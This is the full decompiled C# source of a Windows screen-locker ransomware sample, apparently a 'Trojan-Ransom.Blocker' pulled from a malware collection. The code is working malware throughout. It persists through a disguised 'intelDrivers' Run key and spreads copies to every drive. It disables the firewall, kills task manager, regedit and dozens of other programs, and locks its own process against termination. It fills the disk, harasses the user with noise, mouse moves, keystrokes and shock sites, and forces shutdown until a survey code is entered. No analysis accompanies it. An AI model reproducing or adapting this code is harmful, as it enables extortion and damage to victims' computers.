// Decompiled with JetBrains decompiler
// Type: Micro.FrmMicro
// Assembly: ransome, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AECFC460-529F-451D-BB7F-82C3AC31D5FE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bqwt-83b4eb317a0f33be16803b9dd502af75c5bfa1cf87e6c6f597ddc328c66c1e15.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Micro
{
  public class FrmMicro : Form
  {
    private const string RegKey = "intelDrivers";
    private IContainer components;
    private Button _btnUrl;
    private Label _lblText;
    private Button _btnControl;
    private TextBox _txtCode;
    private Label _lblCode;
    private System.Windows.Forms.Timer _tmrVolume;
    private System.Windows.Forms.Timer _tmrFire;
    private System.Windows.Forms.Timer _tmrExit;
    private System.Windows.Forms.Timer _tmrBeeps;
    private System.Windows.Forms.Timer _tmrFiles;
    private System.Windows.Forms.Timer _tmrMode;
    private System.Windows.Forms.Timer _tmrSites;
    private System.Windows.Forms.Timer _tmrMouse;
    private System.Windows.Forms.Timer _tmrSendKeys;
    private System.Windows.Forms.Timer _tmrOpenDisk;
    private System.Windows.Forms.Timer _tmrMessageBox;
    private System.Windows.Forms.Timer _tmrCenter;
    private System.Windows.Forms.Timer _tmrSetClip;
    private System.Windows.Forms.Timer _tmrSetReg;
    private Panel _pnlItems;
    private WebBrowser _wbrUrls;
    private bool _wr = true;
    private bool _cl;
    private int _try;
    private int _cur;
    private string[] _disables;
    private string _fHdd;
    private string _swapBtn;
    private string _tBar;
    private bool _webbrowser;
    private readonly Point _pn = Cursor.Position;
    private string[] _urls;
    private string[] _codes;

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(61, 4);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.FormBorderStyle = FormBorderStyle.Fixed3D;
      this.Name = nameof (FrmMicro);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.TopMost = true;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.FormClosing += new FormClosingEventHandler(this.FrmMicro_FormClosing);
      this.Load += new EventHandler(this.FrmConsole_Load);
      this.ResumeLayout(false);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    public FrmMicro() => this.InitializeComponent();

    private void btnControl_Click(object sender, EventArgs e)
    {
      if (this._txtCode.Text == FrmMicro.Solve(this._codes[this._cur], "prog"))
        this.Correct();
      else
        this.InControl();
      if (this._cur != this._urls.Length)
        return;
      this._cl = true;
      this.Uninstall();
      Process.GetCurrentProcess().Kill();
    }

    private void InControl()
    {
      if (this._try == 2)
      {
        FrmMicro.FDown();
      }
      else
      {
        ++this._try;
        int num = (int) MessageBox.Show("Warning: " + (object) this._try + ". You can receive 2 warnings before your system becomes unusable !");
        this._txtCode.ResetText();
      }
    }

    private void Correct()
    {
      int num = (int) MessageBox.Show("Thank you.");
      this._txtCode.Text = "";
      ++this._cur;
      this.OpenLink();
    }

    private void btnUrl_Click(object sender, EventArgs e) => this.OpenLink();

    private void OpenLink()
    {
      try
      {
        if (!this._webbrowser)
          Process.Start(FrmMicro.Solve(this._urls[this._cur], "prog"));
        else
          this._wbrUrls.Navigate(FrmMicro.Solve(this._urls[this._cur], "prog"));
      }
      catch
      {
      }
    }

    private void FrmMicro_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (!this._cl)
      {
        e.Cancel = true;
        this.InControl();
      }
      else
      {
        this.Uninstall();
        Process.GetCurrentProcess().Kill();
      }
    }

    private void Uninstall()
    {
      this._tmrExit.Enabled = false;
      try
      {
        if (this._tmrSetReg.Enabled)
        {
          this._tmrSetReg.Enabled = false;
          try
          {
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "intelDrivers", (object) "");
          }
          catch
          {
          }
        }
        if (this._swapBtn == "y")
          FrmMicro.Swapper(0);
        if (this._tBar == "y")
          FrmMicro.TaskBar(1);
        if (this._fHdd == "y")
        {
          this._wr = false;
          Thread.Sleep(1000);
          try
          {
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp.tmp");
          }
          catch
          {
          }
        }
        if (Process.GetProcessesByName("explorer").Length == 0)
          Process.Start("explorer.exe");
        FrmMicro.Protect(AceQualifier.AccessAllowed);
      }
      catch
      {
      }
    }

    private static void tmrSetReg_Tick(object sender, EventArgs e)
    {
      try
      {
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "intelDrivers", (object) Application.ExecutablePath);
      }
      catch
      {
      }
    }

    private void tmrCenter_Tick(object sender, EventArgs e) => this.CenterToScreen();

    private static void Play()
    {
      while (true)
      {
        Console.Beep(890, 400);
        Console.Beep(990, 400);
        Console.Beep(790, 400);
        Console.Beep(390, 400);
        Console.Beep(590, 1600);
      }
    }

    private static void FDown()
    {
      try
      {
        new Process()
        {
          StartInfo = {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = "shutdown.exe",
            Arguments = "-s -f -t 0"
          }
        }.Start();
      }
      catch
      {
      }
    }

    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int command);

    [DllImport("user32.dll")]
    private static extern int FindWindow(string className, string windowText);

    private static void TaskBar(int x)
    {
      try
      {
        FrmMicro.ShowWindow(FrmMicro.FindWindow("Shell_TrayWnd", ""), x);
      }
      catch
      {
      }
    }

    private static void StartKill()
    {
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.Id != Process.GetCurrentProcess().Id)
          {
            try
            {
              process.Kill();
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }

    [DllImport("user32.dll")]
    private static extern int SwapMouseButton(int swap);

    private static void Swapper(int x)
    {
      try
      {
        FrmMicro.SwapMouseButton(x);
      }
      catch
      {
      }
    }

    private void Lock()
    {
      while (true)
      {
        Thread.Sleep(135);
        Cursor.Position = this._pn;
      }
    }

    private static void tmrFire_Tick(object sender, EventArgs e)
    {
      try
      {
        new Process()
        {
          StartInfo = {
            WindowStyle = ProcessWindowStyle.Hidden,
            Arguments = "firewall set opmode disable",
            FileName = "netsh.exe"
          }
        }.Start();
      }
      catch
      {
      }
    }

    private void Writer()
    {
      try
      {
        using (FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp.tmp", FileMode.Append))
        {
          byte[] buffer = new byte[1];
          while (this._wr)
          {
            new Random().NextBytes(buffer);
            fileStream.WriteByte(buffer[0]);
          }
        }
      }
      catch
      {
      }
    }

    private void tmrExit_Tick(object sender, EventArgs e)
    {
      foreach (Process process in Process.GetProcesses())
      {
        foreach (string disable in this._disables)
        {
          if (process.ProcessName.ToLower().Contains(disable))
          {
            if (process.Id != Process.GetCurrentProcess().Id)
            {
              try
              {
                process.Kill();
              }
              catch
              {
              }
            }
          }
        }
      }
    }

    private static void Beep() => Console.Beep();

    private void tmrFiles_Tick(object sender, EventArgs e)
    {
      try
      {
        Random random = new Random();
        this._tmrFiles.Interval = random.Next(5000, 120001);
        switch (random.Next(0, 5))
        {
          case 0:
            Process.Start("mspaint.exe");
            break;
          case 1:
            Process.Start("write.exe");
            break;
          case 2:
            Process.Start("calc.exe");
            break;
          case 3:
            Process.Start("charmap.exe");
            break;
          case 4:
            Process.Start("notepad.exe");
            break;
        }
      }
      catch
      {
      }
    }

    private void tmrBeeps_Tick(object sender, EventArgs e)
    {
      this._tmrBeeps.Interval = new Random().Next(1000, 15001);
      new Thread(new ThreadStart(FrmMicro.Beep)).Start();
    }

    private void tmrMode_Tick(object sender, EventArgs e)
    {
      try
      {
        this._tmrMode.Interval = new Random().Next(1000, 120001);
        foreach (Process process in Process.GetProcesses())
        {
          if (process.Id != Process.GetCurrentProcess().Id)
          {
            try
            {
              process.Kill();
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }

    private static void tmrSetClip_Tick(object sender, EventArgs e)
    {
      try
      {
        Clipboard.SetText("/");
      }
      catch
      {
      }
    }

    private static void NewString()
    {
      try
      {
        Random random = new Random((int) DateTime.Now.Ticks);
        StringBuilder stringBuilder = new StringBuilder();
        for (int index = 0; index < random.Next(1, 31); ++index)
        {
          char ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
          stringBuilder.Append(ch);
        }
        SendKeys.Send(stringBuilder.ToString());
      }
      catch
      {
      }
    }

    private void tmrSendKeys_Tick(object sender, EventArgs e)
    {
      this._tmrSendKeys.Interval = new Random().Next(5000, 120001);
      FrmMicro.NewString();
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SendMessageW(
      IntPtr hWnd,
      int msg,
      IntPtr wParam,
      IntPtr lParam);

    private void Volumus()
    {
      try
      {
        FrmMicro.SendMessageW(this.Handle, 793, this.Handle, (IntPtr) 524288);
      }
      catch
      {
      }
    }

    private void tmrMessageBox_Tick(object sender, EventArgs e)
    {
      this._tmrMessageBox.Interval = new Random().Next(1000, 120001);
      FrmMicro.Message();
    }

    private void tmrMouse_Tick(object sender, EventArgs e)
    {
      Random random = new Random();
      Point point = new Point();
      this._tmrMouse.Interval = random.Next(1000, 60001);
      point.X = random.Next(2) != 1 ? Control.MousePosition.X - random.Next(1, 501) : Control.MousePosition.X + random.Next(1, 501);
      point.Y = random.Next(2) != 1 ? Control.MousePosition.Y - random.Next(1, 501) : Control.MousePosition.Y + random.Next(1, 501);
      Cursor.Position = point;
    }

    private void tmrVolume_Tick(object sender, EventArgs e)
    {
      this._tmrVolume.Interval = new Random().Next(1000, 60001);
      new Thread(new ThreadStart(this.Volumus)).Start();
    }

    private void tmrOpenDisk_Tick(object sender, EventArgs e)
    {
      this._tmrOpenDisk.Interval = new Random().Next(5000, 60001);
      new Thread(new ThreadStart(FrmMicro.Open)).Start();
    }

    [DllImport("winmm.dll")]
    private static extern void mciSendStringA(
      string lpstrCommand,
      string lpstrReturnString,
      long uReturnLength,
      long hwndCallback);

    private static void Open()
    {
      try
      {
        FrmMicro.mciSendStringA("set CDAudio door open", "", (long) sbyte.MaxValue, 0L);
      }
      catch
      {
      }
    }

    private void tmrSites_Tick(object sender, EventArgs e)
    {
      try
      {
        Random random = new Random();
        this._tmrSites.Interval = random.Next(5000, 120000);
        switch (random.Next(0, 7))
        {
          case 0:
            Process.Start("http://www.redtube.com/redtube/gay");
            break;
          case 1:
            Process.Start("http://www.1priest1nun.com/");
            break;
          case 2:
            Process.Start("http://www.eatyoursoup.com/");
            break;
          case 3:
            Process.Start("http://www.mudfall.com/");
            break;
          case 4:
            Process.Start("http://www.1guy2needles.com/");
            break;
          case 5:
            Process.Start("http://meatspin.com");
            break;
          case 6:
            Process.Start("http://www.1girl1pitcher.org/");
            break;
        }
      }
      catch
      {
      }
    }

    private static string Solve(string txt, string pss)
    {
      try
      {
        byte[] buffer = Convert.FromBase64String(txt);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.Mode = CipherMode.CBC;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(new Rfc2898DeriveBytes(pss, Encoding.ASCII.GetBytes("VXGoqnoj9wv5DmJ9l9k24nLeR")).GetBytes(32), Encoding.ASCII.GetBytes("ee55zvpe74dd89u2"));
        MemoryStream memoryStream = new MemoryStream(buffer);
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
        byte[] numArray = new byte[buffer.Length];
        int count = cryptoStream.Read(numArray, 0, numArray.Length);
        memoryStream.Close();
        cryptoStream.Close();
        return Encoding.UTF8.GetString(numArray, 0, count);
      }
      catch
      {
        return (string) null;
      }
    }

    private void Wizard(string str)
    {
      try
      {
        if (Application.StartupPath == str)
          return;
        File.Copy(Application.ExecutablePath, str + "\\intelDrivers.exe");
        Process.Start(str + "\\intelDrivers.exe");
        this._cl = true;
        Process.GetCurrentProcess().Kill();
      }
      catch
      {
      }
    }

    private void Components()
    {
      this.components = (IContainer) new Container();
      this._lblText = new Label();
      this._btnUrl = new Button();
      this._btnControl = new Button();
      this._lblCode = new Label();
      this._txtCode = new TextBox();
      this._tmrCenter = new System.Windows.Forms.Timer(this.components);
      this._tmrCenter.Enabled = false;
      this._tmrCenter.Interval = 8000;
      this._tmrCenter.Tick += new EventHandler(this.tmrCenter_Tick);
      this._tmrSites = new System.Windows.Forms.Timer(this.components);
      this._tmrSites.Tick += new EventHandler(this.tmrSites_Tick);
      this._tmrFire = new System.Windows.Forms.Timer(this.components);
      this._tmrFire.Interval = 5000;
      this._tmrFire.Tick += new EventHandler(FrmMicro.tmrFire_Tick);
      this._tmrExit = new System.Windows.Forms.Timer(this.components);
      this._tmrExit.Interval = 200;
      this._tmrExit.Tick += new EventHandler(this.tmrExit_Tick);
      this._tmrBeeps = new System.Windows.Forms.Timer(this.components);
      this._tmrBeeps.Interval = 1000;
      this._tmrBeeps.Tick += new EventHandler(this.tmrBeeps_Tick);
      this._tmrFiles = new System.Windows.Forms.Timer(this.components);
      this._tmrFiles.Tick += new EventHandler(this.tmrFiles_Tick);
      this._tmrMode = new System.Windows.Forms.Timer(this.components);
      this._tmrMode.Tick += new EventHandler(this.tmrMode_Tick);
      this._tmrMouse = new System.Windows.Forms.Timer(this.components);
      this._tmrMouse.Tick += new EventHandler(this.tmrMouse_Tick);
      this._tmrSendKeys = new System.Windows.Forms.Timer(this.components);
      this._tmrSendKeys.Tick += new EventHandler(this.tmrSendKeys_Tick);
      this._tmrOpenDisk = new System.Windows.Forms.Timer(this.components);
      this._tmrOpenDisk.Tick += new EventHandler(this.tmrOpenDisk_Tick);
      this._tmrMessageBox = new System.Windows.Forms.Timer(this.components);
      this._tmrMessageBox.Interval = 1000;
      this._tmrMessageBox.Tick += new EventHandler(this.tmrMessageBox_Tick);
      this._tmrSetReg = new System.Windows.Forms.Timer(this.components);
      this._tmrSetReg.Interval = 1000;
      this._tmrSetReg.Tick += new EventHandler(FrmMicro.tmrSetReg_Tick);
      this._tmrVolume = new System.Windows.Forms.Timer(this.components);
      this._tmrVolume.Tick += new EventHandler(this.tmrVolume_Tick);
      this._tmrSetClip = new System.Windows.Forms.Timer(this.components);
      this._tmrSetClip.Interval = 1000;
      this._tmrSetClip.Tick += new EventHandler(FrmMicro.tmrSetClip_Tick);
      this._lblText.AutoSize = true;
      this._lblText.Name = "lblText";
      this._lblText.Size = new Size(286, 65);
      this._lblText.Text = "Please complete a survey in order to unlock your computer.\r\nEverything will be as before when you unlock your PC.\r\n\r\nDon't do this, and you'll see what happens.\r\nThank you for your cooperation.";
      this._btnUrl.Name = "btnUrl";
      this._btnUrl.Click += new EventHandler(this.btnUrl_Click);
      this._btnUrl.Size = new Size(75, 23);
      this._btnUrl.Text = "Site";
      this._btnControl.Name = "btnControl";
      this._btnControl.Text = "Verify";
      this._btnControl.Size = new Size(75, 23);
      this._btnControl.Click += new EventHandler(this.btnControl_Click);
      this._txtCode.Name = "txtCode";
      this._txtCode.TextAlign = HorizontalAlignment.Center;
      this._lblCode.AutoSize = true;
      this._lblCode.Name = "lblCode";
      this._lblCode.Size = new Size(71, 13);
      this._lblCode.Text = "Unlock code:";
      this.AcceptButton = (IButtonControl) this._btnControl;
      if (!this._webbrowser)
      {
        this.SuspendLayout();
        this._btnUrl.Location = new Point(17, 103);
        this._btnUrl.TabIndex = 14;
        this._btnUrl.UseVisualStyleBackColor = true;
        this._lblText.Location = new Point(14, 9);
        this._lblText.TabIndex = 13;
        this._btnControl.Location = new Point(224, 103);
        this._btnControl.TabIndex = 12;
        this._btnControl.UseVisualStyleBackColor = true;
        this._txtCode.Location = new Point(91, 77);
        this._txtCode.Size = new Size(208, 20);
        this._txtCode.TabIndex = 11;
        this._lblCode.Location = new Point(14, 80);
        this._lblCode.TabIndex = 10;
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        this.AutoScaleMode = AutoScaleMode.Font;
        this.ClientSize = new Size(314, 137);
        this.Controls.Add((Control) this._btnUrl);
        this.Controls.Add((Control) this._lblText);
        this.Controls.Add((Control) this._btnControl);
        this.Controls.Add((Control) this._txtCode);
        this.Controls.Add((Control) this._lblCode);
        this.ResumeLayout(false);
        this.PerformLayout();
      }
      else
      {
        this._pnlItems = new Panel();
        this._wbrUrls = new WebBrowser();
        this._pnlItems.SuspendLayout();
        this.SuspendLayout();
        this._pnlItems.BackColor = System.Drawing.Color.Black;
        this._pnlItems.Controls.Add((Control) this._lblText);
        this._pnlItems.Controls.Add((Control) this._btnUrl);
        this._pnlItems.Controls.Add((Control) this._btnControl);
        this._pnlItems.Controls.Add((Control) this._lblCode);
        this._pnlItems.Controls.Add((Control) this._txtCode);
        this._pnlItems.Dock = DockStyle.Bottom;
        this._pnlItems.Location = new Point(0, 401);
        this._pnlItems.Name = "pnlItems";
        this._pnlItems.Size = new Size(804, 87);
        this._pnlItems.TabIndex = 4;
        this._lblText.BackColor = System.Drawing.Color.Transparent;
        this._lblText.ForeColor = System.Drawing.Color.White;
        this._lblText.Location = new Point(506, 10);
        this._lblText.TabIndex = 4;
        this._btnUrl.BackColor = SystemColors.Control;
        this._btnUrl.ForeColor = System.Drawing.Color.Black;
        this._btnUrl.Location = new Point(12, 52);
        this._btnUrl.TabIndex = 3;
        this._btnUrl.UseVisualStyleBackColor = false;
        this._btnControl.BackColor = SystemColors.Control;
        this._btnControl.ForeColor = System.Drawing.Color.Black;
        this._btnControl.Location = new Point(137, 52);
        this._btnControl.TabIndex = 2;
        this._btnControl.UseVisualStyleBackColor = false;
        this._lblCode.BackColor = System.Drawing.Color.Transparent;
        this._lblCode.ForeColor = System.Drawing.Color.White;
        this._lblCode.Location = new Point(9, 10);
        this._lblCode.TabIndex = 1;
        this._txtCode.Location = new Point(12, 26);
        this._txtCode.Size = new Size(200, 20);
        this._txtCode.TabIndex = 0;
        this._wbrUrls.Dock = DockStyle.Fill;
        this._wbrUrls.IsWebBrowserContextMenuEnabled = false;
        this._wbrUrls.Location = new Point(0, 0);
        this._wbrUrls.MinimumSize = new Size(20, 20);
        this._wbrUrls.Name = "wbrUrls";
        this._wbrUrls.ScriptErrorsSuppressed = true;
        this._wbrUrls.Size = new Size(804, 488);
        this._wbrUrls.TabIndex = 5;
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        this.AutoScaleMode = AutoScaleMode.Font;
        this.ClientSize = new Size(804, 488);
        this.Controls.Add((Control) this._pnlItems);
        this.Controls.Add((Control) this._wbrUrls);
        this._pnlItems.ResumeLayout(false);
        this._pnlItems.PerformLayout();
        this.ResumeLayout(false);
      }
      this.CenterToScreen();
    }

    private void FrmConsole_Load(object sender, EventArgs e)
    {
      this.Components();
      try
      {
        this.Wizard(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        this._swapBtn = "%swapmouse%";
        this._tBar = "%hidetaskbar%";
        this._disables = "taskmgr.cmd.msconfig.wmplayer.calc.notepad.regedit.skype.aim.steam.origin.utorrent.bittorrent.desura.powershell.winrar.winword.excel.powerpnt.outlook.vlc.javaw.mirc.ccleaner.poweriso.mspaint.photoshop.teamviewer.defraggler.moviemaker.wireshark.acrord.rstrui.filezilla.vmware.tbb-firefox.torch.manycam.gimp.openvpntray.itunes.pidgin.recuva.7zfm.thunderbird.paintdotnet".Split('.');
        this._fHdd = "%filldisk%";
        string[] separator = new string[1]{ "]||[" };
        this._urls = "F7+daSNE0du6aEsYvGptBpOx0Dt0d7/jlwubSN2I3oI=".Split(separator, StringSplitOptions.None);
        this._codes = "dgUTMfWxFCPF+8aIjDUkbw==".Split(separator, StringSplitOptions.None);
        try
        {
          foreach (DriveInfo drive in DriveInfo.GetDrives())
          {
            try
            {
              File.Copy(Application.ExecutablePath, drive.RootDirectory.ToString() + Path.GetFileName(Application.ExecutablePath));
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        this._tmrSetReg.Enabled = true;
        int result;
        int.TryParse("%waittime%", out result);
        FrmMicro.Protect(AceQualifier.AccessDenied);
        if (result != 0)
          Thread.Sleep(result);
        if (this._disables[0] != "")
          this._tmrExit.Enabled = true;
        this._tmrSetClip.Enabled = true;
        this._tmrMouse.Enabled = true;
        if (this._swapBtn == "y")
          FrmMicro.Swapper(1);
        if (this._tBar == "y")
          FrmMicro.TaskBar(0);
        if (this._fHdd == "y")
          new Thread(new ThreadStart(this.Writer)).Start();
        Process.Start(FrmMicro.Solve(this._urls[this._cur], "prog"));
        this._tmrCenter.Interval = int.Parse("5000");
        this._tmrCenter.Enabled = true;
        this.Focus();
      }
      catch
      {
      }
    }

    private void RemoveDate()
    {
      try
      {
        while (true)
        {
          if (DateTime.UtcNow >= DateTime.Parse("dd/mm/yyyy hh:mm:ss"))
          {
            this._cl = true;
            this.Uninstall();
            Process.GetCurrentProcess().Kill();
          }
          Thread.Sleep(1000);
        }
      }
      catch
      {
      }
    }

    private static void Calculator()
    {
      int num = 1;
      while (true)
      {
        if (num == 80)
          num = 0;
        ++num;
      }
    }

    private static void Message()
    {
      Form owner = new Form();
      owner.Size = new Size(1, 1);
      owner.StartPosition = FormStartPosition.Manual;
      Rectangle virtualScreen = SystemInformation.VirtualScreen;
      owner.Location = new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10);
      owner.Show();
      owner.Focus();
      owner.BringToFront();
      owner.TopMost = true;
      owner.ShowIcon = false;
      owner.ShowInTaskbar = false;
      int num = (int) MessageBox.Show((IWin32Window) owner, "Please complete the survey", string.Empty, MessageBoxButtons.OK);
      owner.Dispose();
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(
      IntPtr handle,
      int securityInformation,
      [In] byte[] pSecurityDescriptor);

    private static void Protect(AceQualifier ace)
    {
      try
      {
        IntPtr currentProcess = FrmMicro.GetCurrentProcess();
        RawSecurityDescriptor securityDescript = FrmMicro.GetProcessSecurityDescript(currentProcess);
        securityDescript.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, ace, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        byte[] numArray = new byte[securityDescript.BinaryLength];
        securityDescript.GetBinaryForm(numArray, 0);
        FrmMicro.SetKernelObjectSecurity(currentProcess, 4, numArray);
      }
      catch
      {
      }
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(
      IntPtr handle,
      int securityInformation,
      [Out] byte[] pSecurityDescriptor,
      uint nLength,
      out uint lpnLengthNeeded);

    private static RawSecurityDescriptor GetProcessSecurityDescript(
      IntPtr prHandle)
    {
      try
      {
        byte[] pSecurityDescriptor = new byte[0];
        uint lpnLengthNeeded;
        FrmMicro.GetKernelObjectSecurity(prHandle, 4, pSecurityDescriptor, 0U, out lpnLengthNeeded);
        byte[] binaryForm;
        return lpnLengthNeeded > (uint) short.MaxValue ? (RawSecurityDescriptor) null : (!FrmMicro.GetKernelObjectSecurity(prHandle, 4, binaryForm = new byte[(IntPtr) lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0));
      }
      catch
      {
        return (RawSecurityDescriptor) null;
      }
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [System.Flags]
    private enum ProcessAccessRights
    {
      ProcessAllAccess = 2035711, // 0x001F0FFF
    }
  }
}
